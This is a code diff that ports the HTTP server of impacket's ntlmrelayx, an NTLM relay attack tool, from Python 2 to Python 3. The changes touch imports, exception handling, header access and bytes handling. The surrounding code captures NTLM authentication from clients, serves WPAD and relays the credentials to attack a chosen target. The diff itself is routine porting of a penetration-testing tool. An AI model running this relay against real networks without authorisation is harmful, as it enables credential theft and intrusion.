@@ -13,15 +13,15 @@
 # Description:
 #             This is the HTTP server which relays the NTLMSSP  messages to other protocols
 
-import SimpleHTTPServer
-import SocketServer
+import http.server
+import socketserver
 import socket
 import base64
 import random
 import struct
 import string
-import traceback
 from threading import Thread
+from six import PY2
 
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
@@ -31,7 +31,7 @@ from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 
 class HTTPRelayServer(Thread):
 
-    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
             self.daemon_threads = True
@@ -39,9 +39,9 @@ class HTTPRelayServer(Thread):
                 self.address_family = socket.AF_INET6
             # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
-            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
+            socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
-    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
@@ -62,19 +62,19 @@ class HTTPRelayServer(Thread):
                 self.target = self.server.config.target.getTarget(self.server.config.randomtargets)
                 LOG.info("HTTPD: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
-            except Exception, e:
+                http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
+            except Exception as e:
+                LOG.debug("Exception:", exc_info=True)
                 LOG.error(str(e))
-                LOG.debug(traceback.format_exc())
 
         def handle_one_request(self):
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
+                http.server.SimpleHTTPRequestHandler.handle_one_request(self)
             except KeyboardInterrupt:
                 raise
-            except Exception, e:
+            except Exception as e:
+                LOG.debug("Exception:", exc_info=True)
                 LOG.error('Exception in HTTP request handler: %s' % e)
-                LOG.debug(traceback.format_exc())
 
         def log_message(self, format, *args):
             return
@@ -82,7 +82,7 @@ class HTTPRelayServer(Thread):
         def send_error(self, code, message=None):
             if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                 return self.do_GET()
-            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_error(self,code,message)
+            return http.server.SimpleHTTPRequestHandler.send_error(self,code,message)
 
         def serve_wpad(self):
             wpadResponse = self.wpad % (self.server.config.wpad_host, self.server.config.wpad_host)
@@ -111,13 +111,13 @@ class HTTPRelayServer(Thread):
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-        def do_AUTHHEAD(self, message = '', proxy=False):
+        def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
                 self.send_response(407)
-                self.send_header('Proxy-Authenticate', message)
+                self.send_header('Proxy-Authenticate', message.decode('utf-8'))
             else:
                 self.send_response(401)
-                self.send_header('WWW-Authenticate', message)
+                self.send_header('WWW-Authenticate', message.decode('utf-8'))
             self.send_header('Content-type', 'text/html')
             self.send_header('Content-Length','0')
             self.end_headers()
@@ -147,9 +147,6 @@ class HTTPRelayServer(Thread):
         def do_CONNECT(self):
             return self.do_GET()
 
-        def do_HEAD(self):
-            return self.do_GET()
-
         def do_GET(self):
             messageType = 0
             if self.server.config.mode == 'REDIRECT':
@@ -173,19 +170,27 @@ class HTTPRelayServer(Thread):
             else:
                 proxy = False
 
-            if (proxy and self.headers.getheader('Proxy-Authorization') is None) or (not proxy and self.headers.getheader('Authorization') is None):
-                self.do_AUTHHEAD(message = 'NTLM',proxy=proxy)
+            if PY2:
+                proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
+                autorizationHeader = self.headers.getheader('Authorization')
+            else:
+                proxyAuthHeader = self.headers.get('Proxy-Authorization')
+                autorizationHeader = self.headers.get('Authorization')
+
+            if (proxy and proxyAuthHeader is None) or (not proxy and autorizationHeader is None):
+                self.do_AUTHHEAD(message = b'NTLM',proxy=proxy)
                 pass
             else:
                 if proxy:
-                    typeX = self.headers.getheader('Proxy-Authorization')
+                    typeX = proxyAuthHeader
                 else:
-                    typeX = self.headers.getheader('Authorization')
+                    typeX = autorizationHeader
                 try:
                     _, blob = typeX.split('NTLM')
                     token = base64.b64decode(blob.strip())
-                except:
-                    self.do_AUTHHEAD(message = 'NTLM', proxy=proxy)
+                except Exception:
+                    LOG.debug("Exception:", exc_info=True)
+                    self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
 
@@ -202,12 +207,12 @@ class HTTPRelayServer(Thread):
 
                 if not self.do_ntlm_auth(token,authenticateMessage):
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                             self.target.scheme, self.target.netloc,
                             authenticateMessage['domain_name'].decode('utf-16le'),
                             authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                             self.target.scheme, self.target.netloc,
                             authenticateMessage['domain_name'].decode('ascii'),
                             authenticateMessage['user_name'].decode('ascii')))
@@ -220,15 +225,15 @@ class HTTPRelayServer(Thread):
                         self.do_REDIRECT()
                     else:
                         #If it was an anonymous login, send 401
-                        self.do_AUTHHEAD('NTLM', proxy=proxy)
+                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                 else:
                     # Relay worked, do whatever we want here...
                     if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                             self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                             authenticateMessage['user_name'].decode('utf-16le')))
                     else:
-                        LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                             self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
                             authenticateMessage['user_name'].decode('ascii')))
 
@@ -255,7 +260,7 @@ class HTTPRelayServer(Thread):
             return
 
         def do_ntlm_negotiate(self, token, proxy):
-            if self.server.config.protocolClients.has_key(self.target.scheme.upper()):
+            if self.target.scheme.upper() in self.server.config.protocolClients:
                 self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                 # If connection failed, return
                 if not self.client.initConnection():
@@ -269,7 +274,7 @@ class HTTPRelayServer(Thread):
                 return False
 
             #Calculate auth
-            self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
+            self.do_AUTHHEAD(message = b'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
             return True
 
         def do_ntlm_auth(self,token,authenticateMessage):
